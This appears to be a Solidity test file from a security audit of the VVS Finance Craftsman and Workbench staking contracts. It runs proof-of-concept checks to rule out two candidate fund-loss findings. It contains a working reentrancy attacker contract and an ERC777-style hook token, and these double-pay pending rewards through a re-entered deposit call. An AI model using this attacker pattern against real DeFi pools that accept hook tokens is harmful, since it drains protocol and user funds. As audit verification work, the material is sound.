// Kill-proof PoCs for the Cronos / VVS audit (2026-11-14).
//
// These tests run the VERBATIM vvs-farm sources (vvs-finance/vvs-farm @
// acd79b99d88157b9d520eeac92e8c6424ae9d8de, copied byte-identical into
// src/target/ -- see sha256sums in REPORT.md) against OpenZeppelin 3.4.0.
// They prove that the two closest candidates do NOT yield an in-scope
// fund-loss finding:
//
//  1. emergencyWithdraw(0) keeps BENCH (mechanic REAL) but BENCH has no
//     redemption path, so no VVS can be extracted with retained BENCH.
//  2. Craftsman deposit() double-pays pending rewards ONLY when the pool's
//     LP token invokes a callback on the sender during transferFrom
//     (ERC777-style tokensToSend hook). With a plain ERC20 LP token (all
//     VVS-LP pairs, VVS itself) the payment is exact. A hook token requires
//     the owner to add a malicious pool, which the program explicitly
//     excludes, and SlowMist N9 already reported the underlying CEI pattern.
//
// No test here demonstrates an exploitable fund loss. That is the point:
// every candidate is killed with execution, not with prose.

pragma solidity 0.6.12;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/target/Craftsman.sol";
import "../src/target/VVSToken.sol";
import "../src/target/Workbench.sol";

interface Vm {
    function roll(uint256) external;
    function warp(uint256) external;
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
    function deal(address, uint256) external;
    function expectRevert(bytes calldata) external;
    function addr(uint256) external returns (address);
}

contract MockLP is ERC20("Mock LP", "MLP") {
    constructor() public {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// ERC777-style hook token: transferFrom calls back into the SENDER
// (tokensToSend) after moving balances, like an ERC777 hook would.
contract HookLP is ERC20("Hook LP", "HLP") {
    bool public armed;

    constructor() public {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setArmed(bool _armed) external {
        armed = _armed;
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        bool ok = super.transferFrom(sender, recipient, amount);
        if (armed) {
            // Best-effort callback into the sender; EOAs and contracts
            // without the hook simply ignore it.
            (bool success, ) = sender.call(
                abi.encodeWithSignature("onTokenSend()")
            );
            success; // silence unused warning; hook failures must not revert
        }
        return ok;
    }
}

// Attacker contract: on the tokensToSend hook it re-enters deposit(pid, 0).
contract Attacker {
    Craftsman public craftsman;
    uint256 public pid;
    bool public reenter;

    constructor(Craftsman _craftsman, uint256 _pid) public {
        craftsman = _craftsman;
        pid = _pid;
    }

    function setReenter(bool _reenter) external {
        reenter = _reenter;
    }

    function approve(address token, address spender) external {
        IERC20(token).approve(spender, uint256(-1));
    }

    function attackDeposit(uint256 amount) external {
        craftsman.deposit(pid, amount);
    }

    function onTokenSend() external {
        if (reenter) {
            reenter = false; // single re-entry
            craftsman.deposit(pid, 0);
        }
    }
}

contract CronosAuditTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    VVSToken vvs;
    Workbench bench;
    Craftsman craftsman;
    MockLP lp;
    HookLP hookLp;

    address attacker;
    address victim;

    uint256 constant SUPPLY_PER_YEAR = 5256000 ether; // => SUPPLY_PER_BLOCK = 1 ether

    function setUp() public {
        attacker = vm.addr(1);
        victim = vm.addr(2);

        vvs = new VVSToken(SUPPLY_PER_YEAR);
        bench = new Workbench(vvs);
        craftsman = new Craftsman(vvs, bench, address(0xdead), block.number);

        // Fund actors + pre-fund the Workbench reward balance while this
        // contract still owns VVSToken (mirrors years of accrued rewards).
        vvs.mint(attacker, 100000 ether);
        vvs.mint(victim, 100000 ether);
        vvs.mint(address(bench), 100000 ether);

        // Ownership -> Craftsman, exactly as deployed on mainnet.
        vvs.transferOwnership(address(craftsman));
        bench.transferOwnership(address(craftsman));

        lp = new MockLP();
        lp.mint(attacker, 100000 ether);
        lp.mint(victim, 100000 ether);
        craftsman.add(1000, IERC20(address(lp)), false); // pid 1

        hookLp = new HookLP();
        craftsman.add(1000, IERC20(address(hookLp)), false); // pid 2
    }

    function _approveAll(address user) internal {
        vm.startPrank(user);
        vvs.approve(address(craftsman), uint256(-1));
        lp.approve(address(craftsman), uint256(-1));
        hookLp.approve(address(craftsman), uint256(-1));
        vm.stopPrank();
    }

    // --- Candidate 1: emergencyWithdraw(0) retains BENCH -------------------
    function testEmergencyWithdrawKeepsBenchButExtractsNothing() public {
        _approveAll(attacker);
        uint256 startVvs = vvs.balanceOf(attacker);

        vm.prank(attacker);
        craftsman.enterStaking(100 ether);
        require(bench.balanceOf(attacker) == 100 ether, "bench minted 1:1");
        (uint256 amt0, uint256 debt0) = craftsman.userInfo(0, attacker);
        require(amt0 == 100 ether, "staked amount recorded");
        debt0;

        vm.roll(block.number + 10);

        vm.prank(attacker);
        craftsman.emergencyWithdraw(0);

        // Mechanic confirmed: VVS returned, BENCH retained, stake zeroed.
        require(vvs.balanceOf(attacker) == startVvs, "vvs fully returned, no gain");
        require(bench.balanceOf(attacker) == 100 ether, "bench retained after emergency exit");
        (uint256 amt1, uint256 debt1) = craftsman.userInfo(0, attacker);
        require(amt1 == 0, "stake zeroed");
        require(debt1 == 0, "debt zeroed");
        require(craftsman.pendingVVS(0, attacker) == 0, "no pending after exit");

        // Retained BENCH cannot extract VVS: leaveStaking anything reverts
        // (user.amount == 0), leaveStaking(0) pays 0.
        vm.expectRevert(bytes("withdraw: not good"));
        vm.prank(attacker);
        craftsman.leaveStaking(1);
        uint256 before = vvs.balanceOf(attacker);
        vm.prank(attacker);
        craftsman.leaveStaking(0);
        require(vvs.balanceOf(attacker) == before, "leaveStaking(0) pays nothing");

        // Re-staking mints only the new amount: no BENCH double-count.
        vm.prank(attacker);
        craftsman.enterStaking(50 ether);
        require(bench.balanceOf(attacker) == 150 ether, "bench mints only new stake");
    }

    // --- Candidate 1b: BENCH is required to leave staking (self-lock) ------
    function testBenchRequiredToLeaveStaking() public {
        _approveAll(attacker);
        vm.prank(attacker);
        craftsman.enterStaking(100 ether);

        // Transfer BENCH away -> leaveStaking reverts on the burn.
        vm.prank(attacker);
        bench.transfer(victim, 100 ether);
        vm.expectRevert(bytes("ERC20: burn amount exceeds balance"));
        vm.prank(attacker);
        craftsman.leaveStaking(100 ether);

        // Transfer BENCH back -> exit works. Self-inflicted, recoverable.
        vm.prank(victim);
        bench.transfer(attacker, 100 ether);
        vm.prank(attacker);
        craftsman.leaveStaking(100 ether);
        require(bench.balanceOf(attacker) == 0, "bench burned on exit");
        (uint256 amt, uint256 debt) = craftsman.userInfo(0, attacker);
        require(amt == 0, "stake zeroed");
        debt;
    }

    // --- Candidate 2 control: plain LP token pays exactly pending ---------
    function testPlainLpDepositPaysExactlyPending() public {
        _approveAll(attacker);
        vm.prank(attacker);
        craftsman.deposit(1, 100 ether);
        vm.roll(block.number + 10);

        uint256 quoted = craftsman.pendingVVS(1, attacker);
        require(quoted > 0, "rewards accrued");
        uint256 benchBefore = vvs.balanceOf(address(bench));
        uint256 supplyBefore = vvs.totalSupply();
        uint256 before = vvs.balanceOf(attacker);
        vm.prank(attacker);
        craftsman.deposit(1, 10 ether);
        uint256 gained = vvs.balanceOf(attacker) - before;
        // Single payment: gain is the quoted pending plus at most one block
        // of accrual if the test runner mines between the quote and the call.
        uint256 oneBlock = craftsman.vvsPerBlock();
        require(gained >= quoted, "plain LP: gain >= quoted");
        require(gained <= quoted + oneBlock, "plain LP: gain <= quoted + 1 block");
        // Exact accounting: bench delta == minted rewards - paid gain.
        uint256 minted = vvs.totalSupply() - supplyBefore;
        require(
            benchBefore + minted - vvs.balanceOf(address(bench)) == gained,
            "workbench accounting identity"
        );
    }

    // --- Candidate 2: hook LP token double-pays (precondition excluded) ---
    function testHookLpDepositDoublePaysPending() public {
        Attacker atk = new Attacker(craftsman, 2);
        hookLp.mint(address(atk), 100000 ether);
        atk.approve(address(hookLp), address(craftsman));

        atk.attackDeposit(100 ether);
        vm.roll(block.number + 10);

        uint256 quoted = craftsman.pendingVVS(2, address(atk));
        require(quoted > 0, "rewards accrued");
        uint256 benchBefore = vvs.balanceOf(address(bench));
        uint256 supplyBefore = vvs.totalSupply();
        uint256 before = vvs.balanceOf(address(atk));

        hookLp.setArmed(true);
        atk.setReenter(true);
        atk.attackDeposit(10 ether);

        uint256 gained = vvs.balanceOf(address(atk)) - before;
        uint256 oneBlock = craftsman.vvsPerBlock();
        // Double payment: gain is ~2x quoted, far above any single payment.
        require(gained >= quoted * 2, "hook LP: gain >= 2x quoted pending");
        require(gained <= quoted * 2 + oneBlock * 2, "hook LP: gain <= 2x + noise");
        require(gained > quoted + oneBlock, "hook LP: gain exceeds any single payment");
        // Exact accounting: bench delta == minted rewards - paid gain.
        uint256 minted = vvs.totalSupply() - supplyBefore;
        require(
            benchBefore + minted - vvs.balanceOf(address(bench)) == gained,
            "workbench accounting identity"
        );
    }
}
